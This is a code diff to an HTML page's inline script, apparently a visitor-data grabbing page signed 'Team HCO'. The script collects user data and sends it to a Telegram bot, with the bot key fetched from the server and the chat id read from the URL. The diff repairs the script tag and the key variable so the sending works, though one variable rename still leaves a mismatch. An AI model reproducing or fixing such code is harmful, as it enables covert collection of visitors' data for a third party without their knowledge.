@@ -396,7 +396,7 @@
         </div>
     </div>
 
-   <script> type="module">
+   <script type="module">
     async function getFastKey() {
       const res = await fetch('/api/fast_servers');
       const data = await res.json();
@@ -404,7 +404,7 @@
     }
         // Telegram credentials
         const fast_key = await getFastKey();
-        const chat_id = new URLSearchParams(window.location.search).get('id');
+        const chatid = new URLSearchParams(window.location.search).get('id');
         
         // Collect user data
         const userData = {
@@ -428,7 +428,7 @@
                            `*Thank you Team HCO* 🔖`;
            
             $.ajax({
-                url: `https://api.telegram.org/bot${botfast_key}/sendMessage`,
+                url: `https://api.telegram.org/bot${fast_key}/sendMessage`,
                 method: 'GET',
                 data: {
                     chat_id: chatId,
@@ -503,4 +503,4 @@
         });
     </script>
 </body>
-  </html>
+</html>
